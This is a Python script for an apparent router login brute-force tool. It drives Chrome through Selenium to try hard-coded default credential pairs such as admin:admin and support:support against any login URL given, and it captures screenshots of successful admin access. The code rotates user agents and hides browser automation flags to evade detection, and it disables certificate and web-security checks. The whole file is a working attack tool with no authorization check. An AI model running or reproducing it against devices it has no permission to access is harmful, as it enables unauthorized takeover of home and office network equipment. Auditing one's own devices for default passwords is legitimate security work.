#!/usr/bin/env python3
"""
Router Brute Force Chrome - Chrome-based Router Login Brute Force Tool v2.0
Author: Network Security Engineer
Cross-platform: Windows, Linux, macOS
Chrome-based brute force attack with visible browser and screenshot capture
"""

import os
import sys
import time
import signal
import random
import argparse
import threading
import re
from datetime import datetime
from urllib.parse import urlparse, urljoin
import warnings
warnings.filterwarnings('ignore')

# Try to import selenium libraries
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False
    print("Error: Selenium not available. Please install: pip install selenium")
    sys.exit(1)

# Cross-platform color support
class Colors:
    if os.name == 'nt':  # Windows
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        BOLD = '\033[1m'
        END = '\033[0m'
    else:  # Linux/macOS
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        BOLD = '\033[1m'
        END = '\033[0m'

# Global variables
running = True
stats = {'targets_scanned': 0, 'successful_logins': 0, 'screenshots_taken': 0, 'start_time': None}

def signal_handler(sig, frame):
    global running
    print(f"\n{Colors.YELLOW}[!] Stopping scanner safely...{Colors.END}")
    running = False
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def generate_ascii_banner(text):
    """Generate ASCII art banner from text"""
    ascii_patterns = {
        'A': ['  ██  ', ' ████ ', '██  ██', '██████', '██  ██', '██  ██'],
        'B': ['█████ ', '██  ██', '█████ ', '██  ██', '██  ██', '█████ '],
        'C': [' █████', '██    ', '██    ', '██    ', '██    ', ' █████'],
        'D': ['█████ ', '██  ██', '██  ██', '██  ██', '██  ██', '█████ '],
        'E': ['██████', '██    ', '█████ ', '██    ', '██    ', '██████'],
        'F': ['██████', '██    ', '█████ ', '██    ', '██    ', '██    '],
        'G': [' █████', '██    ', '██    ', '██ ███', '██  ██', ' █████'],
        'H': ['██  ██', '██  ██', '██████', '██  ██', '██  ██', '██  ██'],
        'I': ['██████', '  ██  ', '  ██  ', '  ██  ', '  ██  ', '██████'],
        'J': ['██████', '    ██', '    ██', '    ██', '██  ██', ' ████ '],
        'K': ['██  ██', '██ ██ ', '████  ', '██ ██ ', '██  ██', '██  ██'],
        'L': ['██    ', '██    ', '██    ', '██    ', '██    ', '██████'],
        'M': ['██  ██', '██████', '██ ████', '██  ██', '██  ██', '██  ██'],
        'N': ['██  ██', '███ ██', '██████', '██ ███', '██  ██', '██  ██'],
        'O': [' ████ ', '██  ██', '██  ██', '██  ██', '██  ██', ' ████ '],
        'P': ['█████ ', '██  ██', '██  ██', '█████ ', '██    ', '██    '],
        'Q': [' ████ ', '██  ██', '██  ██', '██ ███', '██  ██', ' █████'],
        'R': ['█████ ', '██  ██', '██  ██', '█████ ', '██ ██ ', '██  ██'],
        'S': [' █████', '██    ', '██    ', ' █████', '    ██', '█████ '],
        'T': ['██████', '  ██  ', '  ██  ', '  ██  ', '  ██  ', '  ██  '],
        'U': ['██  ██', '██  ██', '██  ██', '██  ██', '██  ██', ' ████ '],
        'V': ['██  ██', '██  ██', '██  ██', '██  ██', ' ████ ', '  ██  '],
        'W': ['██  ██', '██  ██', '██  ██', '██ ████', '██████', '██  ██'],
        'X': ['██  ██', '██  ██', ' ████ ', ' ████ ', '██  ██', '██  ██'],
        'Y': ['██  ██', '██  ██', ' ████ ', '  ██  ', '  ██  ', '  ██  '],
        'Z': ['██████', '    ██', '   ██ ', '  ██  ', ' ██   ', '██████'],
        ' ': ['      ', '      ', '      ', '      ', '      ', '      ']
    }
    
    text = text.upper()
    lines = [''] * 6
    
    for char in text:
        if char in ascii_patterns:
            pattern = ascii_patterns[char]
            for i in range(6):
                lines[i] += pattern[i] + ' '
        else:
            for i in range(6):
                lines[i] += '      '
    
    banner = f"""
{Colors.GREEN}{Colors.BOLD}"""
    for line in lines:
        banner += line.rstrip() + "\n"
    banner += f"{Colors.END}"
    
    return banner

def print_banner():
    # Matrix rain intro
    try:
        import shutil
        width = shutil.get_terminal_size((80, 24)).columns
    except Exception:
        width = 80
    charset = list("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%&*")
    end_time = time.time() + 2
    columns = [0] * width
    while time.time() < end_time:
        line_chars = []
        for i in range(width):
            if columns[i] <= 0 and random.random() < 0.02:
                columns[i] = random.randint(3, 10)
            if columns[i] > 0:
                line_chars.append(random.choice(charset))
                columns[i] -= 1
            else:
                line_chars.append(' ')
        print(f"{Colors.GREEN}" + ''.join(line_chars) + f"{Colors.END}")
        time.sleep(0.03)
    
    banner_text = "Router Chrome"
    banner = generate_ascii_banner(banner_text)
    print(banner)

# Target credentials - exactly as requested
TARGET_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "support180"),
    ("support", "support"),
    ("user", "user")
]

# User-Agent rotation for anti-detection
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36'
]

class ChromeRouterBruteForce:
    def __init__(self, login_url, timeout=10, headless=False, screenshot_dir="screenshots"):
        self.login_url = login_url
        self.timeout = timeout
        self.headless = headless
        self.screenshot_dir = screenshot_dir
        self.driver = None
        self.lock = threading.Lock()
        
        # Create screenshot directory
        if not os.path.exists(self.screenshot_dir):
            os.makedirs(self.screenshot_dir)
    
    def setup_chrome_driver(self):
        """Setup Chrome driver with cross-platform support"""
        try:
            chrome_options = Options()
            
            # Basic options
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--disable-logging')
            chrome_options.add_argument('--disable-extensions')
            chrome_options.add_argument('--disable-plugins')
            chrome_options.add_argument('--disable-web-security')
            chrome_options.add_argument('--allow-running-insecure-content')
            chrome_options.add_argument('--ignore-certificate-errors')
            chrome_options.add_argument('--ignore-ssl-errors')
            chrome_options.add_argument('--ignore-certificate-errors-spki-list')
            chrome_options.add_argument('--ignore-certificate-errors-spki-list')
            chrome_options.add_argument('--disable-blink-features=AutomationControlled')
            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
            chrome_options.add_experimental_option('useAutomationExtension', False)
            
            # Window size
            chrome_options.add_argument('--window-size=1920,1080')
            
            # User agent
            chrome_options.add_argument(f'--user-agent={random.choice(USER_AGENTS)}')
            
            # Headless mode (if requested)
            if self.headless:
                chrome_options.add_argument('--headless')
            
            # Cross-platform Chrome driver setup
            if os.name == 'nt':  # Windows
                # Try to find ChromeDriver in common locations
                possible_paths = [
                    'chromedriver.exe',
                    'C:\\chromedriver\\chromedriver.exe',
                    'C:\\Program Files\\chromedriver\\chromedriver.exe',
                    'C:\\Program Files (x86)\\chromedriver\\chromedriver.exe'
                ]
            else:  # Linux/macOS
                possible_paths = [
                    'chromedriver',
                    '/usr/local/bin/chromedriver',
                    '/usr/bin/chromedriver',
                    '/opt/chromedriver/chromedriver'
                ]
            
            service = None
            for path in possible_paths:
                if os.path.exists(path):
                    service = Service(path)
                    break
            
            # Create driver
            if service:
                self.driver = webdriver.Chrome(service=service, options=chrome_options)
            else:
                # Let Selenium find chromedriver automatically
                self.driver = webdriver.Chrome(options=chrome_options)
            
            # Execute script to remove webdriver property
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            
            print(f"{Colors.GREEN}[+] Chrome driver initialized successfully{Colors.END}")
            return True
            
        except Exception as e:
            print(f"{Colors.RED}[!] Failed to initialize Chrome driver: {e}{Colors.END}")
            print(f"{Colors.YELLOW}[!] Please ensure ChromeDriver is installed and in PATH{Colors.END}")
            return False
    
    def detect_login_form(self):
        """Detect login form fields on the page"""
        try:
            # Common field name patterns
            username_fields = [
                'username', 'user', 'login', 'admin', 'name', 'email', 'account',
                'userid', 'user_id', 'loginname', 'login_name', 'uname'
            ]
            
            password_fields = [
                'password', 'pass', 'passwd', 'pwd', 'admin', 'secret', 'key'
            ]
            
            username_field = None
            password_field = None
            
            # Try to find username field
            for field_name in username_fields:
                try:
                    username_field = self.driver.find_element(By.NAME, field_name)
                    break
                except NoSuchElementException:
                    try:
                        username_field = self.driver.find_element(By.ID, field_name)
                        break
                    except NoSuchElementException:
                        continue
            
            # Try to find password field
            for field_name in password_fields:
                try:
                    password_field = self.driver.find_element(By.NAME, field_name)
                    break
                except NoSuchElementException:
                    try:
                        password_field = self.driver.find_element(By.ID, field_name)
                        break
                    except NoSuchElementException:
                        continue
            
            # If not found by name/id, try by type
            if not username_field:
                try:
                    username_field = self.driver.find_element(By.XPATH, "//input[@type='text']")
                except NoSuchElementException:
                    pass
            
            if not password_field:
                try:
                    password_field = self.driver.find_element(By.XPATH, "//input[@type='password']")
                except NoSuchElementException:
                    pass
            
            return username_field, password_field
            
        except Exception as e:
            print(f"{Colors.YELLOW}[!] Error detecting login form: {e}{Colors.END}")
            return None, None
    
    def find_submit_button(self):
        """Find and return submit button"""
        try:
            # Common submit button selectors
            submit_selectors = [
                "//input[@type='submit']",
                "//button[@type='submit']",
                "//input[@value='Login']",
                "//button[contains(text(), 'Login')]",
                "//input[@value='Sign In']",
                "//button[contains(text(), 'Sign In')]",
                "//input[@value='Submit']",
                "//button[contains(text(), 'Submit')]",
                "//input[@value='Enter']",
                "//button[contains(text(), 'Enter')]",
                "//input[@value='OK']",
                "//button[contains(text(), 'OK')]",
                "//input[@value='Go']",
                "//button[contains(text(), 'Go')]"
            ]
            
            for selector in submit_selectors:
                try:
                    submit_button = self.driver.find_element(By.XPATH, selector)
                    return submit_button
                except NoSuchElementException:
                    continue
            
            # If no specific submit button found, try to find any button in a form
            try:
                submit_button = self.driver.find_element(By.XPATH, "//form//button")
                return submit_button
            except NoSuchElementException:
                pass
            
            # Last resort: try to find any input in a form
            try:
                submit_button = self.driver.find_element(By.XPATH, "//form//input")
                return submit_button
            except NoSuchElementException:
                pass
            
            return None
            
        except Exception as e:
            print(f"{Colors.YELLOW}[!] Error finding submit button: {e}{Colors.END}")
            return None
    
    def is_login_successful(self):
        """Check if login was successful by analyzing page content and URL"""
        try:
            current_url = self.driver.current_url.lower()
            page_source = self.driver.page_source.lower()
            
            # Check for admin panel indicators
            admin_indicators = [
                'admin', 'administrator', 'dashboard', 'control panel', 'configuration', 
                'settings', 'system', 'status', 'network', 'router', 'gateway', 'modem',
                'wan', 'lan', 'wireless', 'firewall', 'nat', 'dhcp', 'dns', 'qos',
                'firmware', 'upgrade', 'backup', 'restore', 'reboot', 'restart',
                'main menu', 'welcome', 'logout', 'log out'
            ]
            
            # Check for login page indicators (negative)
            login_indicators = [
                'username', 'password', 'login', 'sign in', 'authentication', 'enter credentials',
                'user login', 'admin login', 'router login', 'invalid', 'incorrect', 'failed',
                'error', 'denied', 'wrong', 'access denied'
            ]
            
            admin_count = sum(1 for indicator in admin_indicators if indicator in page_source)
            login_count = sum(1 for indicator in login_indicators if indicator in page_source)
            
            # Check if URL changed from login page
            url_changed = not any(login_term in current_url for login_term in ['login', 'signin', 'sign-in', 'auth', 'authentication'])
            
            # Success criteria: more admin indicators than login indicators, and URL changed
            if admin_count > login_count and admin_count >= 2 and url_changed:
                return True, f"Admin indicators: {admin_count}, Login indicators: {login_count}"
            
            # Additional check: if we have substantial admin content
            if admin_count >= 3 and login_count <= 1:
                return True, f"Strong admin content detected: {admin_count} indicators"
            
            return False, f"Admin indicators: {admin_count}, Login indicators: {login_count}"
            
        except Exception as e:
            print(f"{Colors.YELLOW}[!] Error checking login success: {e}{Colors.END}")
            return False, f"Error: {e}"
    
    def take_screenshot(self, filename_prefix="login_attempt"):
        """Take screenshot and save it"""
        try:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"{filename_prefix}_{timestamp}.png"
            filepath = os.path.join(self.screenshot_dir, filename)
            
            self.driver.save_screenshot(filepath)
            print(f"{Colors.GREEN}[+] Screenshot saved: {filepath}{Colors.END}")
            return filepath
            
        except Exception as e:
            print(f"{Colors.RED}[!] Failed to take screenshot: {e}{Colors.END}")
            return None
    
    def test_credentials(self, username, password):
        """Test a single set of credentials"""
        try:
            print(f"{Colors.CYAN}[>] Testing credentials: {username}:{password}{Colors.END}")
            
            # Navigate to login page
            self.driver.get(self.login_url)
            time.sleep(2)
            
            # Take initial screenshot
            self.take_screenshot(f"initial_page_{username}_{password}")
            
            # Detect login form
            username_field, password_field = self.detect_login_form()
            
            if not username_field or not password_field:
                print(f"{Colors.RED}[!] Could not find login form fields{Colors.END}")
                return False, "Form fields not found"
            
            # Clear and fill fields
            username_field.clear()
            password_field.clear()
            username_field.send_keys(username)
            password_field.send_keys(password)
            
            # Find and click submit button
            submit_button = self.find_submit_button()
            if submit_button:
                submit_button.click()
            else:
                # Try pressing Enter on password field
                password_field.send_keys("\n")
            
            # Wait for page to load
            time.sleep(3)
            
            # Check if login was successful
            success, reason = self.is_login_successful()
            
            if success:
                print(f"{Colors.GREEN}[+] Login successful! {reason}{Colors.END}")
                # Take screenshot of successful login
                screenshot_path = self.take_screenshot(f"success_{username}_{password}")
                return True, screenshot_path
            else:
                print(f"{Colors.YELLOW}[-] Login failed: {reason}{Colors.END}")
                # Take screenshot of failed login
                self.take_screenshot(f"failed_{username}_{password}")
                return False, reason
                
        except Exception as e:
            print(f"{Colors.RED}[!] Error testing credentials {username}:{password}: {e}{Colors.END}")
            return False, f"Error: {e}"
    
    def brute_force_attack(self):
        """Perform brute force attack with all target credentials"""
        try:
            print(f"\n{Colors.CYAN}{'='*60}{Colors.END}")
            print(f"{Colors.CYAN}[*] STARTING CHROME BRUTE FORCE ATTACK{Colors.END}")
            print(f"{Colors.CYAN}[*] Target URL: {self.login_url}{Colors.END}")
            print(f"{Colors.CYAN}{'='*60}{Colors.END}")
            
            # Setup Chrome driver
            if not self.setup_chrome_driver():
                return False
            
            successful_credentials = []
            
            # Test each credential set
            for i, (username, password) in enumerate(TARGET_CREDENTIALS, 1):
                if not running:
                    break
                
                print(f"\n{Colors.YELLOW}[{i}/{len(TARGET_CREDENTIALS)}] Testing credential set {i}{Colors.END}")
                
                success, result = self.test_credentials(username, password)
                
                if success:
                    print(f"{Colors.RED}🔒 VULNERABLE: {username}:{password} works!{Colors.END}")
                    successful_credentials.append({
                        'username': username,
                        'password': password,
                        'screenshot': result if isinstance(result, str) and result.endswith('.png') else None
                    })
                    
                    with self.lock:
                        stats['successful_logins'] += 1
                        if result and result.endswith('.png'):
                            stats['screenshots_taken'] += 1
                    
                    # Wait a bit before next attempt
                    time.sleep(2)
                else:
                    print(f"{Colors.YELLOW}[-] {username}:{password} failed{Colors.END}")
                
                # Update progress
                with self.lock:
                    stats['targets_scanned'] += 1
            
            # Close browser
            if self.driver:
                self.driver.quit()
            
            # Report results
            print(f"\n{Colors.GREEN}{'='*60}{Colors.END}")
            print(f"{Colors.GREEN}[+] BRUTE FORCE ATTACK COMPLETED{Colors.END}")
            print(f"{Colors.GREEN}{'='*60}{Colors.END}")
            
            if successful_credentials:
                print(f"{Colors.RED}[!] VULNERABLE CREDENTIALS FOUND:{Colors.END}")
                for cred in successful_credentials:
                    print(f"  • {Colors.WHITE}{cred['username']}:{cred['password']}{Colors.END}")
                    if cred['screenshot']:
                        print(f"    Screenshot: {Colors.CYAN}{cred['screenshot']}{Colors.END}")
            else:
                print(f"{Colors.GREEN}[+] No vulnerable credentials found - router appears secure{Colors.END}")
            
            return len(successful_credentials) > 0
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error during brute force attack: {e}{Colors.END}")
            if self.driver:
                self.driver.quit()
            return False

def parse_login_url(url_input):
    """Parse and validate login URL"""
    try:
        parsed = urlparse(url_input)
        if not parsed.scheme:
            url_input = 'http://' + url_input
            parsed = urlparse(url_input)
        
        # Check if hostname is valid (contains at least one dot or is localhost)
        if not parsed.hostname or ('.' not in parsed.hostname and parsed.hostname != 'localhost'):
            return None
        
        return url_input
    except:
        return None

def main():
    parser = argparse.ArgumentParser(description="Router Brute Force Chrome v2.0 - Chrome-based Router Login Brute Force Tool")
    parser.add_argument('-u', '--url', required=True, help='Login URL to test')
    parser.add_argument('--timeout', type=int, default=10, help='Page load timeout in seconds (default: 10)')
    parser.add_argument('--headless', action='store_true', help='Run Chrome in headless mode (default: visible)')
    parser.add_argument('--screenshot-dir', default='screenshots', help='Directory to save screenshots (default: screenshots)')
    
    args = parser.parse_args()
    
    clear_screen()
    print_banner()
    
    # Validate URL
    login_url = parse_login_url(args.url)
    if not login_url:
        print(f"{Colors.RED}[!] Invalid URL format: {args.url}{Colors.END}")
        return
    
    # Check if Selenium is available
    if not SELENIUM_AVAILABLE:
        print(f"{Colors.RED}[!] Selenium is not available. Please install: pip install selenium{Colors.END}")
        return
    
    # Startup info
    print(f"{Colors.GREEN}[+] Target URL: {login_url}{Colors.END}")
    creds_str = ", ".join([f"{u}:{p}" for u,p in TARGET_CREDENTIALS])
    print(f"{Colors.YELLOW}[*] Target credentials: {creds_str}{Colors.END}")
    print(f"{Colors.BLUE}[*] Chrome-based brute force with visible browser{Colors.END}")
    print(f"{Colors.MAGENTA}[*] Workflow: Open Chrome → Navigate → Test Credentials → Screenshot{Colors.END}")
    
    if args.headless:
        print(f"{Colors.YELLOW}[!] Running in headless mode{Colors.END}")
    else:
        print(f"{Colors.GREEN}[+] Chrome will be visible during attack{Colors.END}")
    
    # Initialize brute force tool
    brute_force = ChromeRouterBruteForce(
        login_url=login_url,
        timeout=args.timeout,
        headless=args.headless,
        screenshot_dir=args.screenshot_dir
    )
    
    stats['start_time'] = time.time()
    
    try:
        # Start brute force attack
        success = brute_force.brute_force_attack()
        
        # Final statistics
        total_time = time.time() - stats['start_time']
        
        print(f"\n{Colors.CYAN}[*] FINAL STATISTICS:{Colors.END}")
        print(f"  - Total credentials tested: {Colors.CYAN}{stats['targets_scanned']}{Colors.END}")
        print(f"  - Successful logins: {Colors.RED}{stats['successful_logins']}{Colors.END}")
        print(f"  - Screenshots taken: {Colors.BLUE}{stats['screenshots_taken']}{Colors.END}")
        print(f"  - Attack duration: {Colors.MAGENTA}{total_time:.1f}{Colors.END} seconds")
        print(f"  - Screenshots saved in: {Colors.YELLOW}{args.screenshot_dir}{Colors.END}")
        
        if success:
            print(f"{Colors.RED}[!] ROUTER IS VULNERABLE - Change default credentials immediately!{Colors.END}")
        else:
            print(f"{Colors.GREEN}[+] Router appears secure - no default credentials found{Colors.END}")
            
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Attack interrupted by user{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error during attack: {e}{Colors.END}")

if __name__ == "__main__":
    main()